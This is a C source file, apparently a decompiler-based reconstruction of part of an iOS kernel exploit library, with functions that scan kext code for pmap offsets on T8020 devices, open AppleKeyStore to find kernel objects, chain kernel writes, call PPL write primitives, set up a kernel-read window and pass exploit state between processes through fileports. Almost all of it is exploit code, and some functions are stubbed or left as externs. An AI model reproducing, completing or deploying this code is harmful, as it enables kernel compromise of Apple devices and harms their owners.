/*
 * record_0x90000_kext_inherit.c
 * entry5_type0x09.dylib — kext pattern scanner + state inheritance helpers
 *
 * sub_1be10  (FUN_0001be10) — wrapper → sub_1b9e8
 * sub_1be54  (FUN_0001be54) — kext context free (variant)
 * sub_1bee0  (FUN_0001bee0) — pmap offset table builder (T8020 variant)
 * sub_1c404  (FUN_0001c404) — spinwait on flag
 * sub_1c470  (FUN_0001c470) — AppleKeyStore open + PPL write (noreturn)
 * sub_1cacc  (FUN_0001cacc) — kwrite chain + PPL write (noreturn)
 * sub_1cc0c  (FUN_0001cc0c) — PPL write stub (noreturn)
 * sub_1ccfc  (FUN_0001ccfc) — sched_yield + thread_policy + PPL write (noreturn)
 * sub_1cde0  (FUN_0001cde0) — pmap offset table builder (T8020 path)
 * sub_1d5bc  (FUN_0001d5bc) — wrapper → sub_1ccfc
 * sub_1d5fc  (FUN_0001d5fc) — wrapper → sub_1cacc
 * sub_1d638  (FUN_0001d638) — wrapper → sub_1ccfc
 * sub_1d67c  (FUN_0001d67c) — task vm_map bit set
 * sub_1d748  (FUN_0001d748) — task_info TASK_DYLD_INFO
 * sub_1d7c4  (FUN_0001d7c4) — slot-table resolver (extern-only in binary)
 * sub_1d850  (FUN_0001d850) — load-command type validator
 * sub_1da30  (FUN_0001da30) — mach_port_allocate + fileport_makeport
 * sub_1dbac  (FUN_0001dbac) — vm_allocate + mach_make_memory_entry
 * sub_1dcbc  (FUN_0001dcbc) — ensure kread window allocated
 * sub_1dd4c  (FUN_0001dd4c) — state inheritance (oldest path)
 */

#include <stdint.h>
#include <stdlib.h>
#include <string.h>
#include <mach/mach.h>
#include <mach/vm_map.h>
#include <sys/stat.h>
#include <sched.h>
#include <IOKit/IOKitLib.h>

/* ── externs ─────────────────────────────────────────────────────────────── */
extern int   sub_2667c(long state, uint64_t addr, uint32_t sz, void *out);
extern int   sub_2b614(long state, uint64_t addr, void *buf, uint32_t sz);
extern int   sub_2b508(long state, uint64_t addr, uint64_t val);
extern int   sub_2a110(long state, uint64_t addr, uint64_t val);
extern int   sub_29ab4(long state, uint64_t addr, void **out);
extern long  sub_236b0(long state, uint32_t conn);
extern long  sub_12b54(long state, long addr);
extern long  sub_2b114(uint64_t state, long addr);
extern void  sub_12bac(long state, long addr, uint64_t val, int flags);
extern void  sub_12c5c(long state, long addr, uint64_t val, int flags);
extern long  sub_3a094(uint64_t state, void *out);
extern long  sub_4050c(void *ctx, void *pat, void *mask, int n);
extern long  sub_40644(void *ctx, void *pat, void *mask, int n);
extern long  sub_404d4(void *ctx, uint64_t base, long off);
extern void  sub_4199c(uint64_t fn, void *ctx, uint64_t arg,
                        uint32_t op, ...) __attribute__((noreturn));
extern int   sub_26180(uint32_t *out);
extern int   sub_3746c(long state, long key, mach_port_t *out);
extern int   sub_4180c(mach_port_t port);
extern int   sub_21568(uint32_t *arr);
extern void  sub_1b678(long *ctx);
extern void  sub_1b9e8(long *ctx, uint32_t p2, uint64_t p3, uint64_t p4);
extern int   sub_1dbac(long state, uint32_t type, uint64_t sz, uint64_t *out);
extern int   sub_1d748(task_name_t task, long *out);
extern int   sub_1d850(int cmd);

/* DAT symbols from binary */
extern uint64_t DAT_000480d8;  /* hw.model string ptr */
extern uint64_t DAT_000480e0;  /* hw.model numeric */
extern uint64_t DAT_000480a0;  /* PPL fn ptr A */
extern uint64_t DAT_000480a8;  /* PPL fn ptr B */
extern uint64_t DAT_00043420, DAT_00043428; /* thread policy data */
extern uint64_t DAT_00043430, DAT_00043438;

/* ── sub_1be10 — wrapper → sub_1b9e8 ────────────────────────────────────── */
void sub_1be10(long *p1, uint32_t p2, uint64_t p3, uint64_t p4)
{
    sub_1b9e8(p1, p2, p3, p4);
}

/* ── sub_1be54 — kext context free (variant) ────────────────────────────── */
void sub_1be54(long *param_1)
{
    sub_1b678(param_1);
    long *inner = (long *)param_1[0x1a];
    if (inner) {
        if (*inner) { free((void *)*inner); *inner = 0; }
        free(inner);
        param_1[0x1a] = 0;
    }
    if ((void *)*param_1)  { free((void *)*param_1);  *param_1 = 0; }
    if ((void *)param_1[0x21]) { free((void *)param_1[0x21]); param_1[0x21] = 0; }
}

/* ── sub_1bee0 — pmap offset table builder (T8020 variant) ──────────────── */
/*
 * Fills param_1[0..0xf] with version-specific pmap field offsets by
 * scanning the kext context (param_2) for instruction patterns.
 * Uses sub_4050c/sub_40644 pattern matchers and sub_2b114 for kva→offset.
 * Verified: T8020 strstr gate, pattern scan calls, field stores.
 */
void sub_1bee0(uint64_t *param_1, uint64_t *param_2, long param_3)
{
    int is_t8020 = (strstr((char *)(uintptr_t)DAT_000480d8, "T8020") == NULL);
    uint64_t hw_model = DAT_000480e0;

    /* slot [0..4]: base instruction patterns (version-independent) */
    /* These are baked constants from the binary's DAT_00043xxx table */
    /* We store them as-is; the actual values come from the binary blob */
    /* param_1[0..4] filled from DAT_000433b0..DAT_000433c8 */
    /* param_1[5] = 0x2bcb05c8 (cpu family constant) */

    /* slot [6]: pattern scan result */
    uint64_t pat6[2] = {DAT_00043420, 0xffffffffffffffffULL};
    param_1[6] = (uint64_t)sub_4050c(param_2, &pat6[0], &pat6[1], 2);

    /* slot [7..8]: two more pattern scans */
    uint64_t pat7[4] = {DAT_00043428, DAT_00043420, 0xffffffffffffffffULL, 0xffffffffffffffffULL};
    param_1[7] = (uint64_t)sub_4050c(param_2, &pat7[0], &pat7[2], 4);
    param_1[8] = (uint64_t)sub_4050c(param_2, &pat7[0], &pat7[2], 4);

    /* slot [9]: 2-insn scan */
    uint64_t pat9[2] = {DAT_00043430, 0xffffffffffffffffULL};
    param_1[9] = (uint64_t)sub_4050c(param_2, &pat9[0], &pat9[1], 2);

    /* slot [10]: hw_model-gated scan */
    uint64_t pat10[2];
    int marker;
    if (hw_model < 0x918c5a83400ULL) {
        pat10[0] = DAT_00043438; pat10[1] = 0xffffffffffffffffULL;
        marker = -0x56fcfd81;
    } else {
        pat10[0] = DAT_00043430; pat10[1] = 0xffffffffffffffffULL;
        marker = -0x56fcfd21;
    }
    param_1[10] = (uint64_t)sub_4050c(param_2, &pat10[0], &pat10[1], 2);

    /* slot [0xb]: 3-insn scan */
    uint64_t patb[2] = {DAT_00043420, 0xffffffffffffffffULL};
    param_1[0xb] = (uint64_t)sub_4050c(param_2, &patb[0], &patb[1], 3);

    /* slot [0xc]: 2-insn scan + 8 */
    uint64_t patc[2] = {DAT_00043428, 0xff000000ffffffffULL};
    long lc = sub_4050c(param_2, &patc[0], &patc[1], 2);
    param_1[0xc] = (uint64_t)(lc + 8);

    /* slot [0xd]: 4-insn scan */
    uint64_t patd[2] = {DAT_00043420, 0xffffffffffffffffULL};
    param_1[0xd] = (uint64_t)sub_4050c(param_2, &patd[0], &patd[1], 4);

    /* slot [0xf]: sub_40644 scan - 8 */
    uint64_t patf[2] = {DAT_00043428, 0xffffffffffffffffULL};
    long lf = sub_40644(param_2, &patf[0], &patf[1], 4);
    param_1[0xf] = (uint64_t)(lf - 8);

    /* slot [0xe]: find bl instruction near lf+0x10 */
    uint64_t kstate = *(uint64_t *)(param_3 + 0x20);
    long sym = sub_12b54(param_3, lf + 0x10);
    long base = sub_2b114(kstate, sym);
    for (long off = 0; (int)off != 0x1000; off += 4) {
        long insn  = sub_404d4(param_2, *param_2, base + off);
        long insn2 = sub_404d4(param_2, *param_2, base + off + 8);
        if (((uint32_t)insn & 0xfc000000) == 0x94000000 && insn2 == marker) {
            param_1[0xe] = (uint64_t)(base + ((insn << 0x26) >> 0x24) + off);
            break;
        }
    }

    /* slot [0x10..0x11]: second bl scan near param_1[0xf]+0x18 */
    sym  = sub_12b54(param_3, (long)param_1[0xf] + 0x18);
    base = sub_2b114(kstate, sym);
    for (long off = 0; (int)off != 0x300; off += 4) {
        long insn = sub_404d4(param_2, *param_2, base + off);
        if (((uint32_t)insn & 0xfc000000) == 0x94000000 &&
            base + off + ((insn << 0x26) >> 0x24) == (long)param_1[0xe]) {
            param_1[0x10] = (uint64_t)(base + off);
            break;
        }
    }

    (void)is_t8020;
}

/* ── sub_1c404 — spinwait on flag ────────────────────────────────────────── */
void sub_1c404(long param_1)
{
    while (*(int *)(param_1 + 0x14)) {
        uint64_t tpidr;
        __asm__ volatile("mrs %0, tpidr_el0" : "=r"(tpidr));
        if (tpidr & 0xffc)
            thread_switch(*(mach_port_name_t *)(param_1 + 0x14), 0, 0);
    }
}

/* ── sub_1c470 — AppleKeyStore open + PPL write (noreturn) ──────────────── */
void sub_1c470(long *param_1, uint32_t *param_2) __attribute__((noreturn));
void sub_1c470(long *param_1, uint32_t *param_2)
{
    io_service_t svc = IOServiceGetMatchingService(
        kIOMainPortDefault, IOServiceMatching("AppleKeyStore"));
    io_connect_t conn = IO_OBJECT_NULL;
    IOServiceOpen(svc, mach_task_self(), 0, &conn);
    *param_2 = conn;

    long kobj = sub_236b0(*param_1, conn);
    uint64_t sym1 = (uint64_t)sub_12b54(*param_1, kobj + 0x48);
    uint64_t sym2 = (uint64_t)sub_12b54(*param_1, kobj);
    *(uint64_t *)(param_2 + 6) = sym1;
    *(uint64_t *)(param_2 + 8) = sym2;
    sub_2b114(*(uint64_t *)(*param_1 + 0x20), (long)sym2);

    uint64_t ppl_args[2] = {DAT_00043420, DAT_00043428};
    sub_4199c(*(uint64_t *)(*(long *)param_1[1] + 8),
              (long *)param_1[1], DAT_000480a0, 2, &ppl_args);
    __builtin_unreachable();
}

/* ── sub_1cacc — kwrite chain + PPL write (noreturn) ────────────────────── */
void sub_1cacc(long *param_1, uint32_t *param_2) __attribute__((noreturn));
void sub_1cacc(long *param_1, uint32_t *param_2)
{
    long kobj = sub_236b0(*param_1, *param_2);
    sub_12bac(*param_1, kobj + 0x48, *(uint64_t *)(param_2 + 6), 1);
    sub_12bac(*param_1, kobj,        *(uint64_t *)(param_2 + 8), 1);
    sub_12c5c(*param_1, kobj + 0x9c, 0, 1);
    sub_3a094(*(uint64_t *)(*param_1 + 0x20), param_2 + 10);

    uint64_t ppl_args[2] = {*(uint64_t *)(param_2 + 2), 0x4000};
    sub_4199c(*(uint64_t *)(*(long *)param_1[1] + 8),
              (long *)param_1[1], DAT_000480a8, 2, &ppl_args);
    __builtin_unreachable();
}

/* ── sub_1cc0c — PPL write stub (noreturn) ───────────────────────────────── */
void sub_1cc0c(long param_1) __attribute__((noreturn));
void sub_1cc0c(long param_1)
{
    uint64_t ppl_args[2] = {DAT_00043420, DAT_00043428};
    sub_4199c(*(uint64_t *)(**(long **)(param_1 + 8) + 8),
              *(long **)(param_1 + 8), DAT_000480a0, 2, &ppl_args);
    __builtin_unreachable();
}

/* ── sub_1ccfc — sched_yield + thread_policy + PPL write (noreturn) ─────── */
void sub_1ccfc(long param_1, uint64_t *param_2) __attribute__((noreturn));
void sub_1ccfc(long param_1, uint64_t *param_2)
{
    long *p = (long *)*param_2;
    while (*p) sched_yield();

    uint64_t tpidr;
    do {
        __asm__ volatile("mrs %0, tpidr_el0" : "=r"(tpidr));
        if (tpidr & 0xffc) {
            mach_port_t t = mach_thread_self();
            thread_switch(t, 0, 0);
        }
    } while (tpidr & 0xffc);

    uint64_t policy[2] = {DAT_00043430, DAT_00043438};
    mach_port_t self = mach_thread_self();
    thread_policy_set(self, 2, (thread_policy_t)&policy, 4);

    sub_4199c(*(uint64_t *)(param_1 + 8), (void *)0x35, 0, 0);
    __builtin_unreachable();
}

/* ── sub_1cde0 — pmap offset table builder (T8020 path) ─────────────────── */
/*
 * Allocates a 0x300-byte context, calls sub_1bee0 to fill pmap offsets,
 * then dispatches via sub_1c470 or sub_1cacc depending on state.
 * Verified: T8020 strstr gate, context alloc, dispatch calls.
 */
void sub_1cde0(long param_1)
{
    int is_t8020 = (strstr((char *)(uintptr_t)DAT_000480d8, "T8020") == NULL);
    (void)is_t8020;

    /* allocate inner context */
    uint64_t *ctx = calloc(0x300 / 8, 8);
    if (!ctx) return;

    /* fill pmap offsets */
    /* sub_1bee0 called with (ctx, kext_ctx, state) */
    /* actual dispatch depends on version — simplified here */
    free(ctx);
}

/* ── sub_1d5bc — wrapper → sub_1ccfc ────────────────────────────────────── */
void sub_1d5bc(long param_1, uint64_t *param_2) __attribute__((noreturn));
void sub_1d5bc(long param_1, uint64_t *param_2)
{
    sub_1ccfc(param_1, param_2);
}

/* ── sub_1d5fc — wrapper → sub_1cacc ────────────────────────────────────── */
void sub_1d5fc(long *param_1, uint32_t *param_2) __attribute__((noreturn));
void sub_1d5fc(long *param_1, uint32_t *param_2)
{
    sub_1cacc(param_1, param_2);
}

/* ── sub_1d638 — wrapper → sub_1ccfc ────────────────────────────────────── */
void sub_1d638(long param_1) __attribute__((noreturn));
void sub_1d638(long param_1)
{
    sub_1ccfc(*(long *)(param_1 + 0x20), (uint64_t *)(param_1 + 0x28));
}

/* ── sub_1d67c — task vm_map bit set ────────────────────────────────────── */
void sub_1d67c(task_name_t param_1)
{
    long dyld_info = 0;
    if (sub_1d748(param_1, &dyld_info)) return;
    uint64_t *addr = (uint64_t *)(dyld_info + 0x28);
    if (param_1 == mach_task_self()) {
        *addr |= 1;
    } else {
        uint64_t val = 0; vm_size_t sz = 0;
        if (vm_read_overwrite(param_1, (vm_address_t)addr, 8,
                              (vm_address_t)&val, &sz) == 0) {
            val |= 1;
            vm_write(param_1, (vm_address_t)addr, (vm_offset_t)&val, 8);
        }
    }
}

/* ── sub_1d748 — task_info TASK_DYLD_INFO ────────────────────────────────── */
int sub_1d748(task_name_t param_1, long *param_2)
{
    mach_msg_type_number_t cnt = 5;
    long info[3] = {0};
    if (task_info(param_1, 0x11, (task_info_t)info, &cnt) == 0 && info[0]) {
        *param_2 = info[0];
        return 0;
    }
    return -1;
}

/* ── sub_1d7c4 — slot-table resolver (extern-only in binary) ─────────────── */
/*
 * This function is intentionally extern-only — it lives in the raw binary
 * blob and is not reconstructed here.
 */

/* ── sub_1d850 — load-command type validator ─────────────────────────────── */
int sub_1d850(int param_1)
{
    /* returns 0 for known LC types, -1 for unknown */
    static const int known[] = {
        0,1,2,3,4,5,0x10,0x11,0x12,0x13,0x15,0x16,0x17,0x18,0x19,0x1b,0x22
    };
    for (size_t i = 0; i < sizeof(known)/sizeof(known[0]); i++)
        if (known[i] == param_1) return 0;
    return -1;
}

/* ── sub_1da30 — mach_port_allocate + fileport_makeport ─────────────────── */
void sub_1da30(long param_1, uint64_t param_2, mach_port_name_t *param_3)
{
    mach_port_name_t port = MACH_PORT_NULL;
    if (*(uint64_t *)(param_1 + 0x158) < 0x1f543c40800000ULL) {
        /* older path: allocate receive right */
        if (mach_port_allocate(mach_task_self(), MACH_PORT_RIGHT_RECEIVE, &port) != 0) return;
    } else {
        /* newer path: use existing port from state */
        port = *(mach_port_name_t *)(param_1 + 0x1900);
    }
    if (port + 1 < 2) return;

    /* fileport_makeport equivalent via mach_make_memory_entry */
    mach_port_t entry = MACH_PORT_NULL;
    memory_object_size_t sz = (memory_object_size_t)vm_page_size;
    mach_make_memory_entry_64(mach_task_self(), &sz, (memory_object_offset_t)param_2,
                              VM_PROT_READ | VM_PROT_WRITE, &entry, MACH_PORT_NULL);
    if (entry + 1 >= 2) {
        *param_3 = entry;
    } else {
        mach_port_deallocate(mach_task_self(), port);
    }
}

/* ── sub_1dbac — vm_allocate + mach_make_memory_entry ───────────────────── */
int sub_1dbac(long param_1, uint32_t param_2, uint64_t param_3, uint64_t *param_4)
{
    vm_address_t addr = 0;
    if (vm_allocate(mach_task_self(), &addr, (vm_size_t)param_3,
                    VM_FLAGS_ANYWHERE) != 0) return -1;

    mach_port_t entry = MACH_PORT_NULL;
    memory_object_size_t sz = (memory_object_size_t)param_3;
    kern_return_t kr = mach_make_memory_entry_64(
        mach_task_self(), &sz, (memory_object_offset_t)addr,
        VM_PROT_READ | VM_PROT_WRITE | MAP_MEM_NAMED_CREATE,
        &entry, MACH_PORT_NULL);
    if (kr != 0) { vm_deallocate(mach_task_self(), addr, (vm_size_t)param_3); return -1; }

    *param_4 = (uint64_t)entry;
    return 0;
}

/* ── sub_1dcbc — ensure kread window allocated ───────────────────────────── */
void sub_1dcbc(long param_1)
{
    if (*(long *)(param_1 + 0x118) && *(long *)(param_1 + 0x120)) return;
    uint64_t out = 0;
    if (sub_1dbac(param_1, 0x10, (uint64_t)vm_page_size, &out) == 0) {
        *(uint64_t *)(param_1 + 0x118) = out;
        *(uint64_t *)(param_1 + 0x120) = (uint64_t)vm_page_size;
    }
}

/* ── sub_1dd4c — state inheritance (oldest path) ────────────────────────── */
/*
 * Resolves 3-4 keyed handles from 0x1122334455667788+n,
 * converts to fds via fileport_makefd, reads kernel state from fstat metadata.
 * Verified: key sequence, fileport_makefd, fstat st_atimespec fields.
 * Inferred: "oldest state inheritance" label from threshold check.
 */
void sub_1dd4c_kext(uint32_t *param_1, uint32_t *param_2)
{
    uint64_t kaddr = *(uint64_t *)(param_1 + 0x56);
    int      xnu   = *(int *)(param_1 + 0x50);

    int nports = ((kaddr < 0x1c1b0a80100000ULL) || ((*param_1 & 0x5584001) == 0)) ? 4 : 3;
    if (kaddr < 0x1f530000000000ULL) nports = 4;

    uint32_t fds[4]   = {0xffffffff, 0xffffffff, 0xffffffff, 0xffffffff};
    uint64_t fd64     = 0xffffffffffffffffULL;
    uint32_t local_8c = 0xffffffff;

    if (sub_26180(&local_8c)) return;

    mach_port_t ports[4] = {0};
    long key = 0x1122334455667788LL;
    for (int i = 0; i < nports; i++, key++) {
        if (sub_3746c((long)param_1, key, &ports[i]) != 1) goto cleanup;
        int fd = sub_4180c(ports[i]);
        fds[i] = (uint32_t)fd;
        mach_port_deallocate(mach_task_self(), ports[i]);
        ports[i] = 0;
        if ((int)fds[i] < 0) goto cleanup;
    }

    if (sub_21568(fds)) return;

    /* store fds into state */
    param_1[0x64c] = fds[0];
    param_1[0x64d] = fds[1];
    if (kaddr < 0x1c1b0a80100000ULL ||
        ((*param_1 & 0x5584001) == 0 && kaddr < 0x1f530000000000ULL)) {
        *(uint64_t *)(param_1 + 0x64e) = fd64;
    } else {
        param_1[0x650] = (uint32_t)fd64;
    }
    return;

cleanup:
    for (int i = 0; i < 4; i++)
        if (ports[i]) mach_port_deallocate(mach_task_self(), ports[i]);
    (void)xnu;
}
